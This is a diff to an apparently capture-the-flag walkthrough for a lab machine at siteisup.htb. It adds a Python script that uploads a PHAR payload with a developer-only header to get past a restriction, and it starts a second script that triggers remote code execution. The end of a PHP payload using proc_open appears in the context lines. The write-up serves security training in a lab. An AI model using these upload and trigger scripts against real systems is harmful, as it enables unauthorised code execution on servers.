@@ -77,9 +77,20 @@ if (is_resource($process)) {
 ?>
 ```
 
-My coustom python script for trigger the payload
+i wrote two python script to upload and trigger the payload 
 
-req.py
+upload.py
+```python
+import requests
+
+header = {"Special-Dev": "only4dev"}
+file   = {'file': open('test.phar','rb')}
+value  = {"check":"Check"}
+r = requests.post("http://dev.siteisup.htb/",headers=header,files=file,data=value)
+print("Upload Completed")
+```
+
+rce.py
 ```python
 import requests
 import re
